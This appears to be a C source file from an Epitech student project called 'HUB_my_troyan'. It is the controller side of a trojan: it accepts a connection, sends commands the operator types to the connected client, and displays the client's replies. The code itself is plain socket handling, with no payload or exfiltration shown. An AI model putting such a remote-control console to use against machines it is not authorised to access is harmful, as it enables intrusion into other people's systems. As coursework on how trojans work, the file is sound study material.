/*
** EPITECH PROJECT, 2021
** HUB_my_troyan
** File description:
** 29/04/2021 process_request.c
*/

#include "troyan_server.h"

static int read_client_response(server_t *server, gui_t *gui)
{
    char buffer[1024];
    ssize_t len = 0;
    const size_t read_size = sizeof(buffer) - 1;

    while ((len = recv(server->client.fd, buffer, read_size, MSG_DONTWAIT)) > 0) {
        buffer[len] = '\0';
        gui_print(&gui->woutput, buffer);
    }
    gui_reset_cursor_pos(gui);
    return EXIT_SUCCESS;
}

static int process_command(server_t *server, gui_t *gui)
{
    char *line = NULL;

    line = gui_prompt(&gui->wprompt);
    if (line) {
        socket_send(&server->client, line);
        if (is_command(line, LOGOUT_CMD)) {
            client_disconnect(server, &gui->woutput);
        }
        free(line);
    }
    gui_reset_cursor_pos(gui);
    return EXIT_FAILURE;
}

int app_process_fd(app_t *app)
{
    server_t *server = &app->server;

    if (server->client_connected
        && FD_ISSET(STDIN_FILENO, &server->select.read_fds)) {
        process_command(server, &app->gui);
    }
    if (server->client_connected
        && FD_ISSET(server->client.fd, &server->select.read_fds)) {
        read_client_response(server, &app->gui);
    }
    if (FD_ISSET(server->sock.fd, &server->select.read_fds)) {
        if (client_connect(server, &app->gui.woutput) == EXIT_FAILURE)
            return EXIT_FAILURE;
    }
    return EXIT_SUCCESS;
}
